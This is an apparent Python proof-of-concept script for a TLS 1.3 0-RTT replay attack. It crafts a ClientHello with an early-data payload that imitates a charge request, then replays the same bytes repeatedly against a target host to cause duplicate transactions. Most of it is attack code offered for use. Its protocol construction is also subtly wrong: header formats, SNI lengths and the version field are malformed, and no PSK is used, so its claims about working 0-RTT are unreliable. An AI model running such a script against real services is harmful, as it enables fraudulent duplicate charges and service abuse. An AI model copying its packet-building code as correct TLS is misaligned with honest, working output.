#!/usr/bin/env python3
"""
Proof-of-Concept: TLS 1.3 0-RTT Replay Attack

This script demonstrates the vulnerability described in RFC 8446 Section 8 and E.5.
It captures a legitimate TLS 1.3 ClientHello containing 0-RTT early data, then
replays the raw packet multiple times to the server. If the server lacks anti-replay
mechanisms (e.g., ClientHello recording) and the application is not idempotent,
this can cause duplicate transactions, cache pollution, or resource exhaustion.

Usage:
    python poc_0rtt_replay_attack.py <target_ip> <target_port> <replay_count>

Prerequisites:
    - Target server must support TLS 1.3 and accept 0-RTT data.
    - Attacker must be able to sniff/capture traffic (simulated here by acting as the client).
"""

import socket
import ssl
import sys
import struct
import time
import hashlib

# --- Configuration ---
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443
REPLAY_COUNT = int(sys.argv[3]) if len(sys.argv) > 3 else 10

# Application payload to send in 0-RTT (e.g., a non-idempotent HTTP POST)
# In a real attack, this would be captured from a legitimate user.
APP_PAYLOAD = b"POST /api/charge HTTP/1.1\r\nHost: example.com\r\nContent-Length: 5\r\n\r\n100.00"

def create_tls_client_hello_with_early_data(app_data: bytes) -> bytes:
    """
    Manually crafts a TLS 1.3 ClientHello with early data extension.
    This simulates the initial legitimate connection to capture the packet.
    """
    # TLS Record Layer Header: Content Type (23=Handshake), Version (0x0303=TLS 1.2 for compatibility, 
    # but actual TLS 1.3 negotiation happens inside), Length
    record_header = struct.pack('>BBH', 0x16, 0x0303, 0) # Length placeholder
    
    # Handshake Header: Type (1=ClientHello), Length, Version (0x0304=TLS 1.3)
    handshake_header = struct.pack('>BBHI', 1, 0, 0x0304) # Length placeholder
    
    # ClientHello Body
    client_hello = b''
    client_hello += struct.pack('>H', 0x0304) # Legacy Version
    client_hello += os.urandom(32) # Random
    client_hello += struct.pack('>B', 32) # Session ID Length
    client_hello += os.urandom(32) # Session ID
    client_hello += struct.pack('>H', 2) # Cipher Suites Length
    client_hello += struct.pack('>H', 0x1301) # TLS_AES_128_GCM_SHA256
    client_hello += struct.pack('>B', 1) # Compression Methods Length
    client_hello += struct.pack('>B', 0) # null compression
    
    # Extensions
    extensions = b''
    # SNI Extension (0x0000)
    extensions += struct.pack('>HH', 0x0000, 15)
    extensions += struct.pack('>H', 13) # Hostname length
    extensions += b'example.com'
    
    # Supported Versions Extension (0x002b)
    extensions += struct.pack('>HH', 0x002b, 3)
    extensions += struct.pack('>H', 2)
    extensions += struct.pack('>H', 0x0304) # TLS 1.3
    
    # Early Data Extension (0x0010) - Indicates client is sending 0-RTT data
    extensions += struct.pack('>HH', 0x0010, 0)
    
    # Early Data Extension Length
    extensions_len = len(extensions)
    extensions_header = struct.pack('>H', extensions_len)
    
    # Build ClientHello
    client_hello += extensions_header + extensions
    
    # Calculate lengths
    client_hello_len = len(client_hello)
    handshake_header = struct.pack('>BBHI', 1, client_hello_len, 0x0304)
    
    # Build Handshake Record
    handshake_record = handshake_header + client_hello
    
    # Calculate record length
    record_len = len(handshake_record)
    record_header = struct.pack('>BBH', 0x16, 0x0303, record_len)
    
    # Build TLS Record
    tls_record = record_header + handshake_record
    
    # Append Application Data Record (0-RTT Data)
    # Content Type 23 = Application Data
    app_record_header = struct.pack('>BBH', 0x17, 0x0303, len(app_data))
    app_record = app_record_header + app_data
    
    return tls_record + app_record

import os

def capture_legitimate_packet() -> bytes:
    """
    Simulates a legitimate client connection to capture the 0-RTT packet.
    In a real attack, this would be done via packet sniffing (e.g., tcpdump).
    """
    print(f"[*] Simulating legitimate client connection to {TARGET_IP}:{TARGET_PORT}...")
    
    # Create a raw socket to send the crafted packet
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    
    # Craft the 0-RTT packet
    packet = create_tls_client_hello_with_early_data(APP_PAYLOAD)
    
    # Send the packet
    sock.sendall(packet)
    print(f"[+] Sent legitimate ClientHello with 0-RTT data ({len(packet)} bytes)")
    
    # Receive server response (ServerHello, etc.)
    # We don't strictly need to complete the handshake for the PoC, but we do it to be realistic
    try:
        response = sock.recv(4096)
        print(f"[+] Received server response ({len(response)} bytes)")
    except Exception as e:
        print(f"[!] Error receiving response: {e}")
    finally:
        sock.close()
    
    return packet

def replay_packet(packet: bytes, count: int):
    """
    Replays the captured 0-RTT packet multiple times to the server.
    This demonstrates the replay attack vector.
    """
    print(f"[*] Starting replay attack with {count} replays...")
    
    for i in range(count):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.sendall(packet)
            print(f"[+] Replay {i+1}/{count} sent")
            
            # Optionally receive response to observe server behavior
            # Some servers may drop connection or return errors after detecting replays
            try:
                response = sock.recv(4096)
                if not response:
                    print(f"[!] Server closed connection on replay {i+1}")
                else:
                    print(f"[+] Server responded ({len(response)} bytes) on replay {i+1}")
            except socket.timeout:
                print(f"[!] Timeout on replay {i+1}")
            except Exception as e:
                print(f"[!] Error on replay {i+1}: {e}")
            
            sock.close()
            time.sleep(0.1) # Small delay to avoid overwhelming the socket buffer
        except Exception as e:
            print(f"[!] Failed to send replay {i+1}: {e}")
            sock.close()

def main():
    print("=== TLS 1.3 0-RTT Replay Attack PoC ===")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Replay Count: {REPLAY_COUNT}")
    print("="*40)
    
    # Step 1: Capture/Generate the legitimate 0-RTT packet
    packet = capture_legitimate_packet()
    
    # Step 2: Replay the packet
    replay_packet(packet, REPLAY_COUNT)
    
    print("\n[*] Attack completed.")
    print("[!] Check server logs for duplicate processing of the application payload.")
    print("[!] If the server is vulnerable, you should see multiple executions of the non-idempotent action.")

if __name__ == "__main__":
    main()
